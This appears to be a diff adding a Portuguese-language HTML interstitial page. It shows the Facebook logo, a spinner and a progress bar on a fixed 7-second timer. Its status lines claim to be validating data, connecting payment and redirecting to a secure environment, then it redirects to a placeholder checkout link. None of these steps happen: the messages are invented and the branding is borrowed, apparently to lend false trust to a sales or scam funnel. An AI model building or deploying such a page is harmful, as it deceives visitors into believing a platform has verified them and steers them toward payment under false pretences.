@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#1178F2">
+<title>Carregando...</title>
+<style>
+  :root {
+    --azul: #1178F2;
+    --azul-escuro: #0b5ccc;
+    --azul-medio: #7db4f8;
+    --azul-claro: #dbeafd;
+    --cinza: #f5f9ff;
+    --branco: #ffffff;
+    --texto: #14233f;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    min-height: 100vh;
+    min-height: 100dvh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: max(16px, env(safe-area-inset-top)) max(14px, env(safe-area-inset-right)) max(16px, env(safe-area-inset-bottom)) max(14px, env(safe-area-inset-left));
+    font-family: "Segoe UI", system-ui, -apple-system, Roboto, Arial, sans-serif;
+    background: var(--branco);
+    color: var(--texto);
+    overflow-x: hidden;
+  }
+
+  .popup {
+    width: 100%;
+    max-width: 380px;
+    background: var(--branco);
+    border-radius: 22px;
+    padding: clamp(28px, 7vw, 36px) clamp(20px, 5.5vw, 28px) clamp(26px, 6vw, 32px);
+    box-shadow: 0 22px 54px rgba(17, 120, 242, .22), 0 6px 16px rgba(17, 120, 242, .1);
+    text-align: center;
+    animation: entrar .6s ease-out both;
+  }
+  @keyframes entrar {
+    from { opacity: 0; transform: translateY(24px) scale(.97); }
+    to   { opacity: 1; transform: none; }
+  }
+
+  .logo-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+    margin: 0 0 24px;
+  }
+  .logo {
+    width: 80px;
+    height: auto;
+    display: block;
+  }
+
+  .spinner {
+    width: 54px;
+    height: 54px;
+    margin: 0 auto 26px;
+    border-radius: 50%;
+    border: 4px solid var(--azul-claro);
+    border-top-color: var(--azul);
+    animation: girar 1s linear infinite;
+  }
+  @keyframes girar { to { transform: rotate(360deg); } }
+
+  .barra {
+    height: 10px;
+    border-radius: 999px;
+    background: var(--azul-claro);
+    overflow: hidden;
+  }
+  .barra span {
+    display: block;
+    height: 100%;
+    width: 0%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, var(--azul-escuro), var(--azul), var(--azul-medio));
+    background-size: 200% 100%;
+    animation: brilho 1.4s linear infinite;
+    transition: width .35s ease-out;
+  }
+  @keyframes brilho {
+    from { background-position: 0% 0; }
+    to   { background-position: 200% 0; }
+  }
+
+  .percentual {
+    margin-top: 10px;
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--azul);
+    font-variant-numeric: tabular-nums;
+  }
+
+  .status {
+    margin-top: 20px;
+    min-height: 22px;
+    font-size: 14.5px;
+    color: #5a6b8c;
+  }
+  .status .ponto {
+    display: inline-block;
+    width: 8px; height: 8px;
+    margin-right: 8px;
+    border-radius: 50%;
+    background: var(--azul);
+    animation: piscar 1s ease-in-out infinite;
+    vertical-align: middle;
+  }
+  @keyframes piscar { 50% { opacity: .3; } }
+
+  .status span.texto {
+    display: inline-block;
+    animation: surgir .35s ease-out both;
+  }
+  @keyframes surgir {
+    from { opacity: 0; transform: translateY(4px); }
+    to   { opacity: 1; transform: none; }
+  }
+
+  .legenda {
+    margin-top: 18px;
+    font-size: 11.5px;
+    color: #9aa3ba;
+    line-height: 1.4;
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .spinner, .barra span, .status .ponto, .popup { animation: none; }
+  }
+</style>
+</head>
+<body>
+
+  <section class="popup" role="status" aria-live="polite">
+    <div class="logo-container">
+      <img
+        class="logo"
+        src="https://thumb.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1280px-Facebook_Logo_%282019%29.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=thumbnail"
+        alt="Logo"
+        decoding="async"
+      >
+    </div>
+
+    <div class="spinner" aria-hidden="true"></div>
+
+    <div class="barra"><span id="barra"></span></div>
+    <div class="percentual" id="percentual">0%</div>
+
+    <div class="status">
+      <i class="ponto" aria-hidden="true"></i><span class="texto" id="status">Processando dados</span>
+    </div>
+
+    <p class="legenda">Não feche ou atualize esta página durante o processo.</p>
+  </section>
+
+<script>
+  (function () {
+    var duracao = 7000; // 7 segundos
+    var etapas = [
+      { ate: 0,   texto: 'Processando dados' },
+      { ate: 30,  texto: 'Validando dados' },
+      { ate: 60,  texto: 'Conectando pagamento' },
+      { ate: 85,  texto: 'Redirecionando para ambiente seguro' }
+    ];
+
+    var barra = document.getElementById('barra');
+    var percentual = document.getElementById('percentual');
+    var status = document.getElementById('status');
+    var etapaAtual = -1;
+    var inicio = null;
+
+    function ease(x) { return 1 - Math.pow(1 - x, 2); }
+
+    function passo(ts) {
+      if (inicio === null) inicio = ts;
+      var p = Math.min((ts - inicio) / duracao, 1);
+      var pct = Math.round(ease(p) * 100);
+
+      barra.style.width = pct + '%';
+      percentual.textContent = pct + '%';
+
+      var novaEtapa = 0;
+      for (var i = 0; i < etapas.length; i++) {
+        if (pct >= etapas[i].ate) novaEtapa = i;
+      }
+      if (novaEtapa !== etapaAtual) {
+        etapaAtual = novaEtapa;
+        status.textContent = etapas[novaEtapa].texto;
+        status.style.animation = 'none';
+        void status.offsetWidth;
+        status.style.animation = '';
+      }
+
+      if (p < 1) {
+        requestAnimationFrame(passo);
+      } else {
+        status.textContent = 'Concluído';
+        setTimeout(function () {
+          window.location.href = 'COLOCAAQUIOLINKDECHECKOUT';
+        }, 500);
+      }
+    }
+    requestAnimationFrame(passo);
+  })();
+</script>
+</body>
+</html>
